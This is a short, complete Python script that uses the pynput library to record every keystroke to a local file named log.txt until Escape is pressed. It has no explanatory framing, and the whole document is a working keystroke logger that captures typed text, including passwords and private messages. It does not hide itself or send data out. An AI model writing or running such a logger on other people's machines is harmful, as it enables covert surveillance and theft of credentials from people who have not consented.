from pynput import keyboard

def on_press(key):
    write_file(key)

def write_file(key):
    with open('log.txt', 'a') as file:
        key_string = str(key).replace("'", "")
        if key_string.find("backspace") > 0:
            file.write("|BS|")
        elif key_string.find("space") > 0:
            file.write(" ")
        elif key_string.find("enter") > 0:
            file.write("\n")
        elif key_string.find("shift") > 0:
            pass
        else:
            file.write(key_string)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start with new log file and collect events until released
open("log.txt", "w").close()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()